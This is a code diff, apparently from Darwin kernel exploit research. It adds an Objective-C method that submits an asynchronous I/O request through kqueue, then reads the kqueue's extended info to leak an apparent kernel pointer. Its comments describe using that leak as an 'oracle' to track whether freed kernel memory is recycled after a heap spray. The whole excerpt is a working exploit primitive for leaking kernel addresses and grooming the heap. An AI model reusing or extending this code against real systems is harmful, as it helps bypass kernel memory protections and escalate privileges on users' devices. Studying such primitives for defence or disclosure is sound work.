@@ -264,4 +264,55 @@ verdict:
     return log;
 }
 
++ (uint64_t)witnessEntryKptr {
+    /* 2026-11-20 v5 oracle (findings: 2026-11-20_aio_followup_readback_spray):
+       the aio lane's slot witness — the address the next live entry lands at.
+       SAME value across observations = deterministic self-recycle; a MOVED or
+       missing value = the freed neighborhood went to the churn. Read-only. */
+    int rfd = 0, wfd = 0;
+    if (!p063_make_fifo(&rfd, &wfd)) return 0;
+    uint64_t out = 0;
+    int kq = kqueue();
+    if (kq >= 0) {
+        struct aiocb cb;
+        memset(&cb, 0, sizeof cb);
+        static char wbuf[16];
+        cb.aio_fildes = rfd;
+        cb.aio_buf = wbuf;
+        cb.aio_nbytes = sizeof wbuf;
+        cb.aio_offset = 0;
+        cb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
+        cb.aio_sigevent.sigev_signo = kq;   /* the codebase Darwin law (tap line 204) */
+        cb.aio_sigevent.sigev_value.sival_ptr = &cb;
+        int ret0 = 0, err0 = 0;
+        void *args[3] = { &cb, &ret0, &err0 };
+        pthread_t th;
+        if (pthread_create(&th, NULL, p063_aio_submit, args) == 0)
+            pthread_join(th, NULL);
+        usleep(30000);   /* let the kernel attach the knote + entry */
+        struct audit_kevent_extinfo infos[8];
+        memset(infos, 0, sizeof infos);
+        int ret = proc_pidfdinfo(getpid(), kq, PROC_PIDFDKQUEUE_EXTINFO,
+                                 infos, (int)sizeof(infos));
+        int count = ret > 0 ? ret : 0;
+        if (count > 8) count = 8;
+        for (int i = 0; i < count; i++) {
+            if (infos[i].kqext_kev.filter == -3 &&
+                p063_looks_kptr(infos[i].kqext_sdata)) {
+                out = infos[i].kqext_sdata;
+                break;
+            }
+        }
+        /* honest teardown of the witness's own submission */
+        aio_cancel(rfd, &cb);
+        for (int i = 0; i < 100000; i++)
+            if (aio_error(&cb) != EINPROGRESS) break;
+        aio_return(&cb);
+        close(kq);
+    }
+    close(rfd); close(wfd);
+    return out;
+}
+
+
 @end
